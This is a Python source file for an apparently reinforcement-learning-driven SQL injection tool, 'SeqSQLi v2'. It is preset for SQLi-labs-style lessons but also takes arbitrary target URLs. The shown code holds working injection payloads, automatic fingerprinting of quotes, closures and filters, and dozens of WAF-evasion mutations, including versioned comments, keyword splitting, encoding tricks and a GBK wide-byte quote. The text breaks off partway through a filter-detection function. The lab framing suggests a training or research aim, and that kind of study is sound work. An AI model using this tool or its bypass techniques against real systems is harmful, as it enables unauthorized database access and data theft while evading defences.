"""
agent.py  —  SeqSQLi v2 (standalone, single-file)
==================================================
All seqsqli/ modules inlined. This file is self-contained — only requires
third-party deps: requests, numpy, gymnasium, stable-baselines3.

Usage:
    python agent.py --less 27 --episodes 300
    python agent.py --less 27 --episodes 300 --no-fingerprint
    python agent.py --url http://target/vuln.php --param id
    python agent.py --less 1 --extract --load
    python agent.py --all --episodes 200
    python agent.py --less 27 --algo ppo --timesteps 50000
"""

import argparse
import json
import random
import re
import time
import urllib.parse
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

import numpy as np
import requests
import gymnasium as gym
from gymnasium import spaces
from stable_baselines3 import PPO
from stable_baselines3.common.callbacks import BaseCallback


# =============================================================================
# CONFIG  (was: seqsqli/config.py)
# =============================================================================
DEFAULT_BASE_URL = "https://lab.0xffsec.co"
TIMEOUT          = 8
REQUEST_DELAY    = 0.05
MAX_RETRIES      = 2

ALPHA         = 0.15
GAMMA         = 0.9
EPSILON       = 0.4
EPSILON_DECAY = 0.993
EPSILON_MIN   = 0.05

MAX_STEPS    = 15
MAX_EPISODES = 300
STEP_PENALTY = 0.08

QTABLE_PATH  = "q_table.json"
RESULTS_PATH = "results.json"


# =============================================================================
# RESPONSE CLASSIFICATION  (was: seqsqli/core/response.py)
# =============================================================================
SUCCESS_INDICATORS = [
    "your login name", "you are in",
    "your username", "your password", "flag",
]
WAF_INDICATORS = [
    "blocked", "forbidden", "not acceptable",
    "attack detected", "firewall", "waf",
]
SQL_ERROR_INDICATORS = [
    "sql syntax", "warning: mysqli", "unclosed quotation",
    "you have an error in your sql", "supplied argument is not",
    "warning: mysql", "error in your sql syntax",
]
FILTERED_INDICATORS = [
    "your input has been filtered",
    "input was stripped",
    "query stripped",
]
DATA_MARKERS = ("~~START~~", "~~END~~")


def classify_response(resp_text: str, status_code: int) -> str:
    text = resp_text.lower()
    if status_code in (403, 406, 429, 501):
        return "WAF_BLOCKED"
    for ind in SUCCESS_INDICATORS:
        if ind in text:
            return "SUCCESS"
    for ind in WAF_INDICATORS:
        if ind in text:
            return "WAF_BLOCKED"
    for ind in SQL_ERROR_INDICATORS:
        if ind in text:
            return "SQL_ERROR"
    for ind in FILTERED_INDICATORS:
        if ind in text:
            return "FILTERED"
    if status_code >= 500:
        return "SERVER_ERROR"
    return "UNKNOWN"


def extract_between_markers(resp_text: str) -> Optional[str]:
    start, end = DATA_MARKERS
    idx_s = resp_text.find(start)
    idx_e = resp_text.find(end)
    if idx_s != -1 and idx_e != -1 and idx_e > idx_s:
        return resp_text[idx_s + len(start):idx_e].strip()
    return None


def has_valid_output(resp_text: str, baseline_text: str) -> bool:
    if not baseline_text:
        return False
    return (
        abs(len(resp_text) - len(baseline_text)) > 50
        or resp_text.lower().count("your") > baseline_text.lower().count("your")
    )


# =============================================================================
# TARGET PROFILE + PRESETS  (was: seqsqli/core/profile.py)
# =============================================================================
@dataclass
class TargetProfile:
    url:             str        = ""
    param:           str        = "id"
    method:          str        = "GET"
    quote:           str        = ""
    closure:         str        = ""
    suffix:          str        = "--+"
    columns:         int        = 0
    injectable_cols: List[int]  = field(default_factory=list)
    filter_type:     str        = "unknown"
    extra_params:    Dict       = field(default_factory=dict)
    base_payload:    str        = ""
    dbms:            str        = "mysql"


LESS_PRESETS: Dict = {
    1:    {"path": "Less-1/",   "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "none"},
    2:    {"path": "Less-2/",   "param": "id",    "method": "GET",  "quote": "",    "closure": "",   "filter": "none"},
    3:    {"path": "Less-3/",   "param": "id",    "method": "GET",  "quote": "'",   "closure": ")",  "filter": "none"},
    4:    {"path": "Less-4/",   "param": "id",    "method": "GET",  "quote": '"',   "closure": ")",  "filter": "none"},
    5:    {"path": "Less-5/",   "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "none"},
    6:    {"path": "Less-6/",   "param": "id",    "method": "GET",  "quote": '"',   "closure": "",   "filter": "none"},
    7:    {"path": "Less-7/",   "param": "id",    "method": "GET",  "quote": "'",   "closure": "))", "filter": "none"},
    8:    {"path": "Less-8/",   "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "none"},
    9:    {"path": "Less-9/",   "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "none"},
    10:   {"path": "Less-10/",  "param": "id",    "method": "GET",  "quote": '"',   "closure": "",   "filter": "none"},
    11:   {"path": "Less-11/",  "param": "uname", "method": "POST", "quote": "'",   "closure": "",   "filter": "none",
           "extra_params": {"passwd": "x", "submit": "Submit"}},
    12:   {"path": "Less-12/",  "param": "uname", "method": "POST", "quote": '"',   "closure": ")",  "filter": "none",
           "extra_params": {"passwd": "x", "submit": "Submit"}},
    25:   {"path": "Less-25/",  "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "or_and"},
    25.1: {"path": "Less-25a/", "param": "id",    "method": "GET",  "quote": "",    "closure": "",   "filter": "or_and"},
    26:   {"path": "Less-26/",  "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "comments_spaces_or_and"},
    26.1: {"path": "Less-26a/", "param": "id",    "method": "GET",  "quote": "'",   "closure": ")",  "filter": "comments_spaces_or_and"},
    27:   {"path": "Less-27/",  "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "union_select_comments_spaces"},
    27.1: {"path": "Less-27a/", "param": "id",    "method": "GET",  "quote": '"',   "closure": "",   "filter": "union_select_comments_spaces"},
    28:   {"path": "Less-28/",  "param": "id",    "method": "GET",  "quote": "'",   "closure": ")",  "filter": "union_select_combined"},
    28.1: {"path": "Less-28a/", "param": "id",    "method": "GET",  "quote": "'",   "closure": ")",  "filter": "union_select_combined"},
    32:   {"path": "Less-32/",  "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "addslashes_gbk"},
    33:   {"path": "Less-33/",  "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "addslashes_gbk"},
    36:   {"path": "Less-36/",  "param": "id",    "method": "GET",  "quote": "'",   "closure": "",   "filter": "addslashes_gbk"},
}


# =============================================================================
# HTTP ENGINE  (was: seqsqli/core/http.py)
# =============================================================================
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (SeqSQLi/2.0)"})

_request_count: int = 0


def _smart_url_encode(payload: str) -> str:
    """URL-encode a payload while preserving existing %XX sequences."""
    parts = re.split(r'(%[0-9a-fA-F]{2})', payload)
    result = []
    for part in parts:
        if re.match(r'^%[0-9a-fA-F]{2}$', part):
            result.append(part)
        else:
            result.append(urllib.parse.quote(part, safe="-_.~!*()+,;:@/=&"))
    return ''.join(result)


def send_request(target: TargetProfile, payload: str):
    global _request_count
    _request_count += 1

    for attempt in range(MAX_RETRIES + 1):
        try:
            if target.method == "GET":
                encoded = _smart_url_encode(payload)
                sep = "&" if "?" in target.url else "?"
                full_url = f"{target.url}{sep}{target.param}={encoded}"
                resp = session.get(full_url, timeout=TIMEOUT, allow_redirects=True)
            else:
                data = {target.param: payload}
                data.update(target.extra_params)
                resp = session.post(target.url, data=data,
                                    timeout=TIMEOUT, allow_redirects=True)
            return resp.text, resp.status_code

        except requests.exceptions.Timeout:
            if attempt < MAX_RETRIES:
                time.sleep(1)
                continue
            return "TIMEOUT", 408
        except requests.exceptions.ConnectionError:
            if attempt < MAX_RETRIES:
                time.sleep(2)
                continue
            return "CONNECTION_ERROR", 503
        except Exception as e:
            return str(e), 500

    return "MAX_RETRIES_EXCEEDED", 503


def get_request_count() -> int:
    return _request_count


# =============================================================================
# MUTATIONS  (was: seqsqli/core/mutations.py)
# =============================================================================
_SQL_SEP = r'(?:\s|%0[a9bcd]|%0d%0a|%a0|/\*\*/)+'


class MutationEngine:
    """Applies transformations to SQL payloads."""

    @staticmethod
    def comment_space(payload: str) -> str:
        return re.sub(r'(?<!/)(?<!\*) (?!\*/)(?!/)', '/**/', payload)

    @staticmethod
    def random_case(payload: str) -> str:
        _BLACKLISTED_CASES = {
            'union', 'UNION', 'Union',
            'select', 'SELECT', 'Select',
        }
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR',
                     'ORDER', 'BY', 'GROUP', 'HAVING', 'INSERT', 'UPDATE',
                     'DELETE', 'NULL', 'CONCAT', 'TABLE', 'DATABASE',
                     'INFORMATION_SCHEMA', 'LIMIT', 'LIKE']
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def randomize_match(m, _bl=_BLACKLISTED_CASES):
                for _ in range(20):
                    candidate = ''.join(
                        c.upper() if random.random() > 0.5 else c.lower()
                        for c in m.group()
                    )
                    if candidate not in _bl:
                        return candidate
                chars = list(m.group().lower())
                chars[1] = chars[1].upper()
                return ''.join(chars)
            result = pattern.sub(randomize_match, result)
        return result

    @staticmethod
    def url_encode_keywords(payload: str) -> str:
        replacements = {
            'UNION': '%55NION', 'union': '%55nion', 'Union': '%55nion',
            'SELECT': '%53ELECT', 'select': '%53elect', 'Select': '%53elect',
        }
        result = payload
        for old, new in replacements.items():
            result = result.replace(old, new)
        return result

    @staticmethod
    def keyword_split(payload: str) -> str:
        result = payload
        for kw_upper, kw_lower in [('UNION', 'union'), ('SELECT', 'select')]:
            for kw in [kw_upper, kw_lower, kw_upper.capitalize()]:
                if kw in result and f"/**/{kw[len(kw)//2:]}" not in result:
                    mid = len(kw) // 2
                    result = result.replace(kw, f"{kw[:mid]}/**/{kw[mid:]}")
        return result

    @staticmethod
    def double_encode(payload: str) -> str:
        if "%2520" not in payload:
            return payload.replace(" ", "%2520")
        return payload

    @staticmethod
    def newline_space(payload: str) -> str:
        if "%0a" not in payload.lower():
            return payload.replace(" ", "%0a")
        return payload

    @staticmethod
    def tab_space(payload: str) -> str:
        if "%09" not in payload:
            return payload.replace(" ", "%09")
        return payload

    @staticmethod
    def crlf_space(payload: str) -> str:
        if "%0d%0a" not in payload.lower():
            return payload.replace(" ", "%0d%0a")
        return payload

    @staticmethod
    def parenthesis_space(payload: str) -> str:
        result = payload
        _SEP = r'(?:\s|%0[a9bcd]|%a0|/\*\*/)+'
        m = re.search(r'(?i)(UNION)' + _SEP + r'(SELECT)' + _SEP + r'(.+?)(--.*)$', result)
        if not m:
            m = re.search(r'(?i)(UNION)' + _SEP + r'(SELECT)' + _SEP + r'(.+)$', result)
        if m:
            suffix_part = m.group(4) if m.lastindex >= 4 else ""
            cols = m.group(3).rstrip().split(',')
            wrapped = ','.join(f"({c.strip()})" for c in cols)
            result = f"{result[:m.start()]}{m.group(1)}(SELECT {wrapped}){suffix_part}"
        return result

    @staticmethod
    def versioned_comment(payload: str) -> str:
        if "/*!" in payload:
            return payload
        versions = ["50000", "50001", "50100", "40100"]
        ver = random.choice(versions)
        result = payload
        for kw in ['UNION', 'union', 'Union']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}{kw}*/")
                break
        for kw in ['SELECT', 'select', 'Select']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}{kw}*/")
                break
        return result

    @staticmethod
    def case_variation(payload: str) -> str:
        _SAFE_UNION  = ['uNion', 'uNIon', 'UnIoN', 'uNiOn', 'unION', 'UNIoN']
        _SAFE_SELECT = ['seLect', 'sElEcT', 'SeLeCt', 'sELEct', 'selECT', 'SELEcT']

        result = payload
        m = re.search(r'(?i)(?<![a-zA-Z])(union)(?![a-zA-Z])', result)
        if not m:
            m = re.search(r'(?i)(union)', result)
        if m:
            result = result[:m.start(1)] + random.choice(_SAFE_UNION) + result[m.end(1):]

        m = re.search(r'(?i)(?<![a-zA-Z])(select)(?![a-zA-Z])', result)
        if not m:
            m = re.search(r'(?i)(select)', result)
        if m:
            result = result[:m.start(1)] + random.choice(_SAFE_SELECT) + result[m.end(1):]

        return result

    @staticmethod
    def double_keyword_or(payload: str) -> str:
        result = payload
        result = re.sub(r'\bOR\b', '||', result)
        result = re.sub(r'\bor\b', '||', result)
        return result

    @staticmethod
    def double_keyword_and(payload: str) -> str:
        result = payload
        result = re.sub(r'\bAND\b', '&&', result)
        result = re.sub(r'\band\b', '&&', result)
        return result

    @staticmethod
    def nested_or(payload: str) -> str:
        return re.sub(r'\bOR\b', 'OORR', payload, flags=re.IGNORECASE)

    @staticmethod
    def nested_and(payload: str) -> str:
        return re.sub(r'\bAND\b', 'AANDND', payload, flags=re.IGNORECASE)

    @staticmethod
    def hex_encode_values(payload: str) -> str:
        m = re.search(r'(?i)SELECT' + _SQL_SEP + r'([\d,\s%0-9a-fA-F\'\"]+)', payload)
        if m:
            cols = m.group(1).split(',')
            hex_cols = []
            for c in cols:
                c = c.strip()
                if c.isdigit():
                    hex_cols.append(f"0x{c.encode().hex()}")
                else:
                    hex_cols.append(c)
            new_cols = ','.join(hex_cols)
            return payload[:m.start(1)] + new_cols + payload[m.end(1):]
        return payload

    @staticmethod
    def gbk_bypass(payload: str) -> str:
        if "%bf%27" in payload.lower() or "%bf'" in payload.lower():
            return payload
        return payload.replace("'", "%bf%27")

    @staticmethod
    def scientific_notation(payload: str) -> str:
        m = re.search(r'(?i)SELECT' + _SQL_SEP + r'([\d,\s%0-9a-fA-F\'\"]+)', payload)
        if m:
            cols = m.group(1).split(',')
            sci_cols = []
            for c in cols:
                c = c.strip()
                if c.isdigit():
                    sci_cols.append(f"{c}e0")
                else:
                    sci_cols.append(c)
            return payload[:m.start(1)] + ','.join(sci_cols) + payload[m.end(1):]
        return payload

    @staticmethod
    def concat_char(payload: str) -> str:
        def replace_quoted(m):
            s = m.group(1)
            chars = ','.join(str(ord(c)) for c in s)
            return f"CONCAT(CHAR({chars}))"
        return re.sub(r"'([^']{1,20})'", replace_quoted, payload)

    @staticmethod
    def between_space(payload: str) -> str:
        if "%a0" not in payload.lower():
            return payload.replace(" ", "%a0")
        return payload

    @staticmethod
    def backtick_keyword(payload: str) -> str:
        if "`" in payload:
            return payload
        for kw in ['UNION', 'union', 'SELECT', 'select']:
            if kw in payload:
                payload = payload.replace(kw, f"`{kw}`")
        return payload

    @staticmethod
    def hash_newline(payload: str) -> str:
        if "%23" in payload:
            return payload
        junk = random.choice(["foo", "xyz", "aaa", "sqli"])
        result = re.sub(
            r'(?i)(union)(' + _SQL_SEP + r')(select)',
            lambda m: f"{m.group(1)}%23{junk}%0A{m.group(3)}",
            payload,
            count=1
        )
        return result

    @staticmethod
    def hash_newline_all(payload: str) -> str:
        if "%23" in payload:
            return payload
        junk = random.choice(["aa", "xx", "zz"])
        return payload.replace(" ", f"%23{junk}%0A")

    @staticmethod
    def char_split_comment(payload: str) -> str:
        if "/*U*/" in payload or "/*u*/" in payload:
            return payload
        def split_kw(kw):
            return ''.join(f"/*{c}*/" for c in kw)
        result = payload
        for kw in ['UNION', 'union']:
            if kw in result:
                result = result.replace(kw, split_kw(kw))
                break
        for kw in ['SELECT', 'select']:
            if kw in result:
                result = result.replace(kw, split_kw(kw))
                break
        return result

    @staticmethod
    def versioned_00000(payload: str) -> str:
        if "/*!" in payload:
            return payload
        result = payload
        for kw in ['UNION', 'union', 'Union']:
            if kw in result:
                result = result.replace(kw, f"/*!00000{kw}*/")
                break
        for kw in ['SELECT', 'select', 'Select']:
            if kw in result:
                result = result.replace(kw, f"/*!00000{kw}*/")
                break
        return result

    @staticmethod
    def versioned_12345(payload: str) -> str:
        if "/*!" in payload:
            return payload
        m = re.search(r'(?i)(UNION)' + _SQL_SEP + r'(SELECT)', payload)
        if m:
            return payload[:m.start()] + f"/*!12345{m.group(1)} {m.group(2)}*/" + payload[m.end():]
        return payload

    @staticmethod
    def plus_separator(payload: str) -> str:
        if "+" in payload and " " not in payload:
            return payload
        return payload.replace(" ", "+")

    @staticmethod
    def nested_union_select(payload: str) -> str:
        if "UNIunion" in payload or "SELselect" in payload:
            return payload
        result = payload
        for u in ['UNION', 'union']:
            if u in result:
                result = result.replace(u, "UNIunionON")
                break
        for s in ['SELECT', 'select']:
            if s in result:
                result = result.replace(s, "SELselectECT")
                break
        return result

    @staticmethod
    def vtab_space(payload: str) -> str:
        if "%0b" not in payload.lower():
            return payload.replace(" ", "%0b")
        return payload

    @staticmethod
    def formfeed_space(payload: str) -> str:
        if "%0c" not in payload.lower():
            return payload.replace(" ", "%0c")
        return payload

    @staticmethod
    def distinct_inject(payload: str) -> str:
        if re.search(r'(?i)distinct', payload):
            return payload
        variant = random.choice(["DISTINCT", "DISTINCTROW", "ALL"])
        result = re.sub(
            r'(?i)(union)(' + _SQL_SEP + r')(select)',
            lambda m: f"{m.group(1)}{m.group(2)}{variant}{m.group(2)}{m.group(3)}",
            payload,
            count=1
        )
        return result

    @staticmethod
    def param_pollute_comment(payload: str) -> str:
        if "/*&" in payload:
            return payload
        junk = random.choice(["&a=", "&x=1", "&id=", "&q="])
        return re.sub(
            r'(?i)(UNION|SELECT|FROM|WHERE|AND|OR|ORDER|BY)(' + _SQL_SEP + r')',
            lambda m: f"{m.group(1)}/*{junk}*/",
            payload
        )

    @staticmethod
    def versioned_urlenc_combo(payload: str) -> str:
        if "/*!" in payload:
            return payload
        ver = random.choice(["50000", "50001"])
        result = payload
        for kw in ['UNION', 'union', 'Union']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}%55{kw[1:]}*/")
                break
        for kw in ['SELECT', 'select', 'Select']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}%53{kw[1:]}*/")
                break
        return result

    @staticmethod
    def paren_full_wrap(payload: str) -> str:
        _SEP = r'(?:\s|%0[a9bcd]|%a0|/\*\*/)+'
        m = re.search(r'(?i)(UNION)' + _SEP + r'(SELECT)' + _SEP + r'([\d\w,\s\'\"]+?)(\s*--.*)$', payload)
        if not m:
            m = re.search(r"(?i)(UNION)" + _SEP + r"(SELECT)" + _SEP + r"([\d\w,\s'\"]+)$", payload)
        if m:
            u, s, cols_str = m.group(1), m.group(2), m.group(3)
            suffix = m.group(4) if m.lastindex >= 4 else ""
            cols = [c.strip() for c in cols_str.split(',')]
            wrapped = ','.join(f"({c})" for c in cols)
            return f"{payload[:m.start()]}{u}({s} {wrapped}){suffix}"
        return payload

    @staticmethod
    def url_encode_mid_char(payload: str) -> str:
        if "%6e" in payload.lower() or "%6c" in payload.lower():
            return payload
        result = payload
        for u in ['union', 'UNION', 'Union']:
            if u in result:
                mid = len(u) // 2
                c = u[mid]
                result = result.replace(u, f"{u[:mid]}%{ord(c):02x}{u[mid+1:]}")
                break
        for s in ['select', 'SELECT', 'Select']:
            if s in result:
                mid = len(s) // 2
                c = s[mid]
                result = result.replace(s, f"{s[:mid]}%{ord(c):02x}{s[mid+1:]}")
                break
        return result

    @staticmethod
    def mixed_versioned_newline(payload: str) -> str:
        if "/*!" in payload:
            return payload
        result = payload
        for u in ['UNION', 'union']:
            if u in result:
                result = result.replace(u, f"%0A/*!50000%55{u[1:]}*/")
                break
        for s in ['SELECT', 'select']:
            if s in result:
                result = result.replace(s, f"/*!%53{s[1:]}*/%0A")
                break
        return result

    @staticmethod
    def unhex_wrap(payload: str) -> str:
        if 'unhex' in payload.lower():
            return payload
        for fn in ['CONCAT', 'concat', 'GROUP_CONCAT', 'group_concat']:
            if fn + '(' in payload:
                payload = payload.replace(f"{fn}(", f"unhex(hex({fn}(")
                idx = payload.rfind(')')
                if idx > 0:
                    payload = payload[:idx+1] + "))" + payload[idx+1:]
                break
        return payload

    @staticmethod
    def convert_charset(payload: str) -> str:
        if 'CONVERT' in payload or 'convert' in payload:
            return payload
        charset = random.choice(["latin1", "ascii", "utf8", "binary"])
        pattern = re.compile(r'((?:group_)?concat\([^)]*\))', re.IGNORECASE)
        m = pattern.search(payload)
        if m:
            return payload[:m.start()] + f"CONVERT({m.group(1)} USING {charset})" + payload[m.end():]
        return payload

    @staticmethod
    def double_url_encode_comment(payload: str) -> str:
        if "%252f" in payload:
            return payload
        return payload.replace("/**/", "%252f%252a*/")


MUTATIONS = {
    "comment":           MutationEngine.comment_space,
    "newline":           MutationEngine.newline_space,
    "tab_space":         MutationEngine.tab_space,
    "crlf":              MutationEngine.crlf_space,
    "vtab":              MutationEngine.vtab_space,
    "formfeed":          MutationEngine.formfeed_space,
    "between_space":     MutationEngine.between_space,
    "plus_sep":          MutationEngine.plus_separator,
    "double_encode":     MutationEngine.double_encode,
    "case":              MutationEngine.random_case,
    "case_split":        MutationEngine.case_variation,
    "url_encode":        MutationEngine.url_encode_keywords,
    "url_mid_char":      MutationEngine.url_encode_mid_char,
    "keyword_split":     MutationEngine.keyword_split,
    "char_split":        MutationEngine.char_split_comment,
    "ver_50000":         MutationEngine.versioned_comment,
    "ver_00000":         MutationEngine.versioned_00000,
    "ver_12345":         MutationEngine.versioned_12345,
    "ver_urlenc":        MutationEngine.versioned_urlenc_combo,
    "ver_newline":       MutationEngine.mixed_versioned_newline,
    "paren_space":       MutationEngine.parenthesis_space,
    "paren_full":        MutationEngine.paren_full_wrap,
    "hash_nl":           MutationEngine.hash_newline,
    "hash_nl_all":       MutationEngine.hash_newline_all,
    "param_pollute":     MutationEngine.param_pollute_comment,
    "nested_or":         MutationEngine.nested_or,
    "nested_and":        MutationEngine.nested_and,
    "nested_union":      MutationEngine.nested_union_select,
    "double_or":         MutationEngine.double_keyword_or,
    "double_and":        MutationEngine.double_keyword_and,
    "hex_encode":        MutationEngine.hex_encode_values,
    "scientific":        MutationEngine.scientific_notation,
    "concat_char":       MutationEngine.concat_char,
    "unhex_wrap":        MutationEngine.unhex_wrap,
    "convert_charset":   MutationEngine.convert_charset,
    "distinct":          MutationEngine.distinct_inject,
    "gbk_bypass":        MutationEngine.gbk_bypass,
    "backtick":          MutationEngine.backtick_keyword,
    "dbl_url_comment":   MutationEngine.double_url_encode_comment,
}

ACTION_LIST = list(MUTATIONS.keys())

FILTER_MUTATION_HINTS = {
    "none": [
        "comment", "case", "url_encode", "ver_50000",
    ],
    "or_and": [
        "double_or", "double_and", "nested_or", "nested_and",
        "hex_encode", "case", "nested_union",
    ],
    "comments_spaces_or_and": [
        "tab_space", "newline", "between_space", "vtab", "formfeed",
        "crlf", "paren_space", "paren_full", "plus_sep",
        "nested_or", "nested_and", "hex_encode",
        "hash_nl", "hash_nl_all",
    ],
    "union_select_comments_spaces": [
        "case_split", "case_split", "case",
        "newline", "newline", "tab_space", "vtab", "formfeed",
        "between_space",
        "hex_encode",
    ],
    "union_select_combined": [
        "case_split", "case_split", "case",
        "newline", "newline", "tab_space", "vtab", "formfeed",
        "between_space",
        "hex_encode",
        "nested_union",
    ],
    "addslashes_gbk": [
        "gbk_bypass", "hex_encode", "url_encode",
    ],
    "unknown": ACTION_LIST[:15],
}


# =============================================================================
# FINGERPRINTING  (was: seqsqli/core/fingerprint.py)
# =============================================================================
class Fingerprinter:
    """Automatically detect quote char, closure, column count, and filter type."""

    def __init__(self, target: TargetProfile, verbose: bool = True):
        self.target = target
        self.verbose = verbose
        self.baseline_resp = ""
        self.baseline_len = 0
        self.error_resp = ""

    def log(self, msg: str):
        if self.verbose:
            print(f"  [FINGERPRINT] {msg}")

    def _is_same_as_baseline(self, resp: str, threshold: int = 50) -> bool:
        return abs(len(resp) - self.baseline_len) < threshold

    def _has_sql_error(self, resp: str) -> bool:
        text = resp.lower()
        for ind in SQL_ERROR_INDICATORS:
            if ind in text:
                return True
        return False

    def _has_success_data(self, resp: str) -> bool:
        text = resp.lower()
        has_indicators = any(ind in text for ind in SUCCESS_INDICATORS)
        differs = not self._is_same_as_baseline(resp)
        return has_indicators and differs

    def _is_blocked(self, resp: str, status: int) -> bool:
        if status in (403, 406, 429, 501):
            return True
        text = resp.lower()
        return any(ind in text for ind in WAF_INDICATORS + FILTERED_INDICATORS)

    def run(self) -> TargetProfile:
        self.log(f"Target: {self.target.url} | param={self.target.param}")

        self.baseline_resp, baseline_status = send_request(self.target, "1")
        self.baseline_len = len(self.baseline_resp)
        self.log(f"Baseline: status={baseline_status}, len={self.baseline_len}")

        bad_resp, _ = send_request(self.target, "9999999")
        time.sleep(REQUEST_DELAY)
        self.log(f"Bad-ID response: len={len(bad_resp)}")

        self._detect_quote_closure()
        self._detect_suffix()
        self._detect_filter_type()
        self._detect_columns()
        self._detect_injectable_columns()
        self._build_base_payload()

        self.log(f"Profile complete:")
        self.log(f"  quote={self.target.quote!r}  closure={self.target.closure!r}")
        self.log(f"  suffix={self.target.suffix!r}  cols={self.target.columns}")
        self.log(f"  injectable={self.target.injectable_cols}")
        self.log(f"  filter={self.target.filter_type}")
        self.log(f"  base_payload={self.target.base_payload}")

        return self.target

    def _detect_quote_closure(self):
        resp_sq, _ = send_request(self.target, "1'")
        time.sleep(REQUEST_DELAY)
        sq_error = self._has_sql_error(resp_sq)

        resp_dq, _ = send_request(self.target, '1"')
        time.sleep(REQUEST_DELAY)
        dq_error = self._has_sql_error(resp_dq)

        self.log(f"Quote probe: single-quote error={sq_error}, double-quote error={dq_error}")

        if sq_error and not dq_error:
            self.target.quote = "'"
            self._detect_closure("'")
        elif dq_error and not sq_error:
            self.target.quote = '"'
            self._detect_closure('"')
        elif sq_error and dq_error:
            self.target.quote = "'"
            self._detect_closure("'")
        else:
            resp_t, _ = send_request(self.target, "1 AND 1=1")
            resp_f, _ = send_request(self.target, "1 AND 1=2")
            time.sleep(REQUEST_DELAY)

            if abs(len(resp_t) - len(resp_f)) > 20:
                self.target.quote = ""
                self.target.closure = ""
                self.log(f"Detected: numeric injection (no quote)")
                return

            resp_gbk, _ = send_request(self.target, "1%bf%27")
            time.sleep(REQUEST_DELAY)
            if self._has_sql_error(resp_gbk):
                self.target.quote = "%bf%27"
                self.target.closure = ""
                self.log(f"Detected: GBK wide-byte bypass (quote=%bf%27)")
                return

            self.log(f"WARNING: Could not confirm injection type. Defaulting to single-quote.")
            self.target.quote = "'"
            self.target.closure = ""

    def _detect_closure(self, quote: str):
        closures = ["", ")", "))", "')"]

        for closure in closures:
            for suffix in ["--+", "#", f" AND {quote}1{quote}={quote}1"]:
                test = f"1{quote}{closure} AND 1=1{suffix}"
                resp, status = send_request(self.target, test)
                time.sleep(REQUEST_DELAY)

                if not self._has_sql_error(resp) and not self._is_blocked(resp, status):
                    test_f = f"1{quote}{closure} AND 1=2{suffix}"
                    resp_f, _ = send_request(self.target, test_f)
                    time.sleep(REQUEST_DELAY)

                    if abs(len(resp) - len(resp_f)) > 20 or self._has_sql_error(resp_f):
                        self.target.quote = quote
                        self.target.closure = closure
                        self.log(f"Detected: quote={quote!r}, closure={closure!r} (via suffix {suffix!r})")
                        return

        self.target.quote = quote
        self.target.closure = ""
        self.log(f"Detected: quote={quote!r}, closure='' (no closure confirmed)")

    def _detect_suffix(self):
        q = self.target.quote
        c = self.target.closure

        suffix_candidates = [
            ("--+",    "double-dash comment"),
            ("-- -",   "double-dash-space"),
            ("#",      "hash comment"),
            ("%23",    "url-encoded hash"),
            (";%00",   "null byte"),
        ]

        for suffix, desc in suffix_candidates:
            test_t = f"1{q}{c} AND 1=1{suffix}"
            test_f = f"1{q}{c} AND 1=2{suffix}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)
            resp_f, st_f = send_request(self.target, test_f)
            time.sleep(REQUEST_DELAY)

            t_err = self._has_sql_error(resp_t)
            f_err = self._has_sql_error(resp_f)

            if not t_err and not self._is_blocked(resp_t, st_t):
                if abs(len(resp_t) - len(resp_f)) > 20 or f_err:
                    self.target.suffix = suffix
                    self.log(f"Suffix detected: {suffix!r} ({desc})")
                    return

        for suffix, desc in suffix_candidates:
            test_t = f"1{q}{c}%0aAND%0a1=1{suffix}"
            test_f = f"1{q}{c}%0aAND%0a1=2{suffix}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)
            resp_f, st_f = send_request(self.target, test_f)
            time.sleep(REQUEST_DELAY)

            t_err = self._has_sql_error(resp_t)
            f_err = self._has_sql_error(resp_f)

            if not t_err and not self._is_blocked(resp_t, st_t):
                if abs(len(resp_t) - len(resp_f)) > 20 or f_err:
                    self.target.suffix = suffix
                    self.log(f"Suffix detected: {suffix!r} ({desc}) [via newline spaces]")
                    return

        if q and q not in ("%bf%27",):
            close_suffix = f" AND {q}1{q}={q}1"
            test_t = f"1{q}{c}{close_suffix}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)

            if not self._has_sql_error(resp_t) and not self._is_blocked(resp_t, st_t):
                self.target.suffix = close_suffix
                self.log(f"Suffix detected: quote-closing ({close_suffix!r})")
                return

            close_suffix_nl = f"%0aAND%0a{q}1{q}={q}1"
            test_t = f"1{q}{c}{close_suffix_nl}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)

            if not self._has_sql_error(resp_t) and not self._is_blocked(resp_t, st_t):
                self.target.suffix = "QUOTE_CLOSE"
                self.log(f"Suffix detected: quote-closing (spaces filtered, need newline bypass)")
                return

        self.log(f"WARNING: No suffix confirmed, defaulting to QUOTE_CLOSE for safety")
        if q:
            self.target.suffix = "QUOTE_CLOSE"
        else:
            self.target.suffix = "--+"

    def _detect_filter_type(self):
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix

        probes = {}
        probes["space"]        = f"1{q}{c} AND 1=1{suffix}"
        probes["or"]           = f"1{q}{c} OR 1=1{suffix}"
        probes["and"]          = f"1{q}{c} AND 1=1{suffix}"
        probes["comment"]      = f"1{q}{c}/**/AND/**/1=1{suffix}"
        probes["dash_comment"] = f"1{q}{c}--"
        probes["union"]        = f"0{q}{c} UNION ALL SELECT NULL{suffix}"
        probes["select"]       = f"0{q}{c} UNION SELECT NULL{suffix}"

        filters_detected = set()
        probe_results = {}

        for name, payload in probes.items():
            resp, status = send_request(self.target, payload)
            time.sleep(REQUEST_DELAY)

            is_err = self._has_sql_error(resp)
